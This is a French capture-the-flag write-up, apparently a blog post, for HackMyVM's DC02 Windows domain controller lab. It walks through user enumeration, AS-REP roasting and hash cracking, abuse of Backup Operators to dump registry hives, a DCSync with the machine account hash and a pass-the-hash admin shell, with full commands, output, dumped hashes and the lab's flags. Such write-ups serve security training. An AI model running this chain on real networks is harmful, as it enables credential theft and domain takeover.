---
title: "Solution du CTF DC02 de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

 Ce DC02 a été un CTF passionnant, tout comme le précédent. C'est parti !

### Hotel Alpha Charlie Kilo

```console
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-18 17:54:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:5F:DC:AC (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Toujours pas d'exploitation web en vue.

On peut rejeter un coup d'œil à LDAP et on voit que le nom de la machine est resté `DC01`.

```console
$ ldapsearch -H ldap://192.168.56.126/ -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
--- snip ---
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=L
 OCAL
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=SOUPEDECODE,DC=LOCAL
schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
isSynchronized: TRUE
highestCommittedUSN: 49169
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL
defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
currentTime: 20250618175500.0Z
configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Faute d'avoir des identifiants, on remet kerbrute sur la table. On retrouve les deux mêmes utilisateurs que sur le précédent CTF (`DC01`). 

```console
./kerbrute userenum -d soupedecode.local --dc 192.168.56.126 /opt/SecLists/Usernames/Names/names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/18/25 - Ronnie Flathers @ropnop

2025/06/18 11:01:17 >  Using KDC(s):
2025/06/18 11:01:17 >   192.168.56.126:88

2025/06/18 11:01:17 >  [+] VALID USERNAME:       admin@soupedecode.local
2025/06/18 11:01:17 >  [+] VALID USERNAME:       charlie@soupedecode.local
2025/06/18 11:01:18 >  Done! Tested 10177 usernames (2 valid) in 1.062 seconds
```

Cette fois pas besoin de chercher très loin : le mot de passe de `charlie` est `charlie` :

```console
$ ./nxc smb -u charlie -p charlie --shares 192.168.56.126
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         192.168.56.126  445    DC01             [*] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.126  445    DC01             C$                              Default share
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share
```

Le compte ne permet pas d'obtenir un shell que ce soit avec psexec, wmiexec ou winrm. So what ? Kerberoast ?

```console
$ python GetUserSPNs.py -dc-ip 192.168.56.126 -outputfile /tmp/hashes.txt soupedecode.local/charlie:charlie
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

### You win the internet!

Pas mieux... [AS-REP](https://book.hacktricks.wiki/fr/windows-hardening/active-directory-methodology/asreproast.html) du coup ?

```console
$ python3 GetNPUsers.py -dc-ip 192.168.56.126 -usersfile /tmp/uniq_users.txt -no-pass -request soupedecode.local/  | tee output.txt
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[-] User aaaron589 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aadam701 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abianca784 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User acarl237 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User acarl386 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User adelia337 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
--- snip ---
[-] User zwyatt377 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:3b6a625efc3caa47dc23550f01ed5b6e$5127477bc7a290e7ea24f2d4fd2bd01fc4ce01c8a88022ab0e6046cbc0899e4e568c5e91162b754c4b1b675d13acc0418b0a9c2d4ce59752424a8220af2551c74e4a70acb2256e2f585f87dd8ca3a57d3966c8c25a851f817ca238b72addde78ec70737e6e269cb8a00ff806b08eb16dc2896667f121c80e53cf084df9c6fbcab386a7fbc836fa0767c1b23f6f5dd474a297412537c269d91ca3a9dd52ad84411ccf9926f74a5d6712c11931fcd7f89d5c2a6192471aace091d45dc69a34068cb9af2a4091e010731414ef16ae3b58cdd057e9862ed0d48b45d116bd30d639543c818028b76d99d50b903ff44ca1e7e675bdf549bb6b
[-] User zyara746 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zzach427 doesn't have UF_DONT_REQUIRE_PREAUTH set
```

On obtient le hash de l'utilisateur `zximena448` que l'on s'empresse de casser :

```console
root@7c7fc38e3e60:~# hashcat -m 18200 /data/hash.txt /data/rockyou.txt
--- snip ---
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:3b6a625efc3caa47dc23550f01ed5b6e$5127477bc7a290e7ea24f2d4fd2bd01fc4ce01c8a88022ab0e6046cbc0899e4e568c5e91162b754c4b1b675d13acc0418b0a9c2d4ce59752424a8220af2551c74e4a70acb2256e2f585f87dd8ca3a57d3966c8c25a851f817ca238b72addde78ec70737e6e269cb8a00ff806b08eb16dc2896667f121c80e53cf084df9c6fbcab386a7fbc836fa0767c1b23f6f5dd474a297412537c269d91ca3a9dd52ad84411ccf9926f74a5d6712c11931fcd7f89d5c2a6192471aace091d45dc69a34068cb9af2a4091e010731414ef16ae3b58cdd057e9862ed0d48b45d116bd30d639543c818028b76d99d50b903ff44ca1e7e675bdf549bb6b:internet
```

Le mot de passe est `internet`.

On peut désormais accéder à des partages, mais toujours pas de shell possible.

```console
$ ./nxc smb -u zximena448 -p internet --shares 192.168.56.126
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\zximena448:internet 
SMB         192.168.56.126  445    DC01             [*] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$          READ            Remote Admin
SMB         192.168.56.126  445    DC01             C$              READ,WRITE      Default share
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share
```

On peut au moins récupérer le flag `2fe79eb0e02ecd4dd2833cfcbbdb504c` dans le `user.txt` sur le bureau de l'utilisateur.

Notre premier compte `charlie` a les permissions nécessaires pour questionner le LDAP. On va s'en servir pour se renseigner sur le compte `zximena448`.

```console
$ ldapsearch -x -H ldap://192.168.56.126 -D "charlie@soupedecode.local" -w 'charlie' -b "DC=soupedecode,DC=local" "(sAMAccountName=zximena448)" memberOf
# extended LDIF
#
# LDAPv3
# base <DC=soupedecode,DC=local> with scope subtree
# filter: (sAMAccountName=zximena448)
# requesting: memberOf 
#

# Zach Ximena, Users, SOUPEDECODE.LOCAL
dn: CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

### Smooth Backup Operator

Le compte fait donc partie du groupe `Backup Operators`. Ce groupe a des capacités pour copier les fichiers, mais depuis SMB, je n'accède à rien.

En fouillant un peu je trouve cette technique utilisée par [0xdf sur le CTF HTB: Cicada](https://0xdf.gitlab.io/2025/02/15/htb-cicada.html) :

```console
$ reg.py 'soupedecode.local/zximena448:internet'@192.168.56.126 backup -o 'C:\windows\temp\'
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\windows\temp\\SAM.save
[*] Saved HKLM\SYSTEM to C:\windows\temp\\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\windows\temp\\SECURITY.save
```

On force ici la sauvegarde des registres Windows vers le dossier `C:\windows\temp\`.

Je peux ensuite les récupérer via l'accès SMB :

```console
$ smbclient -U zximena448  '//192.168.56.126/c$'
Password for [WORKGROUP\zximena448]:
Try "help" to get a list of possible commands.
smb: \> cd windows
smb: \windows\> cd temp
smb: \windows\temp\> ls
NT_STATUS_ACCESS_DENIED listing \windows\temp\*
smb: \windows\temp\> get SAM.save
getting file \windows\temp\SAM.save of size 28672 as SAM.save (4666,6 KiloBytes/sec) (average 4666,7 KiloBytes/sec)
smb: \windows\temp\> get SECURITY.save
getting file \windows\temp\SECURITY.save of size 32768 as SECURITY.save (5333,2 KiloBytes/sec) (average 5000,0 KiloBytes/sec)
smb: \windows\temp\> get SYSTEM.save
getting file \windows\temp\SYSTEM.save of size 11440128 as SYSTEM.save (186199,7 KiloBytes/sec) (average 156000,0 KiloBytes/sec)
```

En local, j'utilise `secretsdump` pour extraire les hashs :

```console
$ secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:71d80a683e1e4d5513469830414e8bf1e63c0134474edefcce03db146283975ffd10c495fd4f2aaf87c6e9c505adf0e5fde5dc23c218cd33d9ed8bed3bc5d287235571e236600027e8f3e2a255ce159864838ae43f647b0d6e5d67ed266112514944c05c3f1068ef7d6dde7a86819db1fba630254da5a9ad3fec5cd96427d87c11e067f7419a36ff7c5ad57d6265113c7df0a2348decd8e89ca41f21d552d35e1840fef4bbb24b7a4503c15c1164ca892985a4f737ea0949f242757c2a3d648275b9e65baf0e2965a408ce8a56b62f9b1fdce79ee603ea53c84af0f9b17a8c33015ebabd64ba7339c3e4067c4504ce7c
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f32f9cf8e3d5655e6561f958c5d37d4e
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up...
```

J'ai cassé le hash du compte administrateur et... le mot de passe était `admin`. Ça n'avait aucun sens.

Je me suis alors rappellé que les hashs ici sont ceux locaux, pas ceux du domaine. OSEF.

Pour avancer, on va utiliser une technique connue sous le nom "Backup Operators to domain admin" qui est décrite dans différents articles :

[Active Directory Privilege Escalation - Practical CTF](https://book.jorianwoltjer.com/windows/active-directory-privilege-escalation#backup-operators-to-domain-admin)

[Vulnlab: Lustrous par UnChleuHacker](https://unchleuhacker.com/2025/06/02/Vulnab%20-%20Lustrous/)

[HTB: Mist writeup by ARZ101](https://arz101.medium.com/hackthebox-mist-c23cdea69ca5)

Cela consiste à se servir du compte machine DC01 obtenu précédemment avec `secretsdump` et profiter de son droit à faire un DCSync :

```console
$ secretsdump.py -hashes :f32f9cf8e3d5655e6561f958c5d37d4e 'SOUPEDECODE.LOCAL/dc01$'@192.168.56.126 | tee /tmp/hashes.txt
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
--- snip ---
```

On obtient alors le hash du compte administrateur, celui du domaine cette fois.

```console
$ wmiexec.py -hashes :8982babd4da89d33210779a6c5b078bd 'SOUPEDECODE.LOCAL/Administrator'@192.168.56.126
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
soupedecode\administrator

C:\>cd users\administrator\desktop
C:\users\administrator\desktop>type root.txt
d41d8cd98f00b204e9800998ecf8427e
```
